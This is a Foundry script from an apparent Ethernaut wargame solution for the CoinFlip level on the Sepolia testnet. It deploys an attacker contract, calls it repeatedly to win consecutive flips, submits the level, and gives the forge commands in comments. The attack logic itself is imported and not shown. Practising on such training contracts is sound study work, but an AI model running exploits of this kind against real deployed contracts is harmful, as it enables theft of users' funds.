// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {CoinFlip} from "../src/Level03.sol";
import {CoinFlipAttack} from "../src/Level03Attack.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";

contract Level03Attack is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        CoinFlip instance = CoinFlip(vm.envAddress("LVL03_ADDR"));
        CoinFlipAttack attack = CoinFlipAttack(
            vm.envAddress("LVL03ATTACK_ADDR")
        );

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attack.atatatack();
        console2.log("consecutiveWins: ", instance.consecutiveWins());

        vm.stopBroadcast();
    }
}

contract Deploy is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        CoinFlipAttack attack = new CoinFlipAttack(
            CoinFlip(vm.envAddress("LVL03_ADDR"))
        );
        console2.log("attacker address: ", address(attack));

        vm.stopBroadcast();
    }
}

contract Submit is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        ethernaut.submitLevelInstance(vm.envAddress("LVL03_ADDR"));

        vm.stopBroadcast();
    }
}

// forge script script/Level03.s.sol:Deploy --broadcast --rpc-url sepolia
// put the address of the attacker contract in the LVL03ATTACK_ADDR env variable
// forge script script/Level03.s.sol:Level03Attack --broadcast --rpc-url sepolia
// you have to run it 10x times... https://github.com/foundry-rs/foundry/issues/1902
// forge script script/Level03.s.sol:Submit --broadcast --rpc-url sepolia
